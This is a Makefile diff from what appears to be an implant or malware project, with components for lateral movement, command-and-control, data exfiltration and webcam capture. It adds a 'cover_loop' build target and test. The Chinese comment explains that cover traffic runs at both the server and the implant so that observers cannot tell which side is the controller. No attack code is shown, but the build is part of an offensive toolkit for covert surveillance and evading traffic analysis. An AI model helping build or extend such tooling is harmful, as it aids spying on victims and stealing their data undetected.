@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -140,7 +140,24 @@ $(BUILD)/test_task_cover: tests/test_task_cover.c $(BUILD)/task_cover.o \
 	  $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
 	  $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover
+# 任务通道的**真实事件循环**：把覆盖从"可调用的函数"变成"长期运行的行为"。
+# 两端各跑一个实例（下行由服务端补、上行由植入体补），只在一端跑覆盖会让
+# 另一方向仍然可读——观察者能看出谁是控制端。
+# 同时补回自适应：take_due 不推进 EWMA 窗口，故本层显式调用 p2p_cover_tick，
+# 并暴露 note_data 让循环外发送的数据被计入。
+$(BUILD)/cover_loop.o: src/cover_loop.c include/cover_loop.h \
+                       include/exfil_task_cover.h include/exfil_task_link.h | $(BUILD)
+	$(CC) $(CFLAGS) -c $< -o $@
+
+$(BUILD)/test_cover_loop: tests/test_cover_loop.c $(BUILD)/cover_loop.o \
+    $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
+    $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
+    $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
+	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
+	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -150,6 +167,7 @@ test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BU
 	./$(BUILD)/test_task_circuit
 	./$(BUILD)/test_link_cover
 	./$(BUILD)/test_task_cover
+	./$(BUILD)/test_cover_loop
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
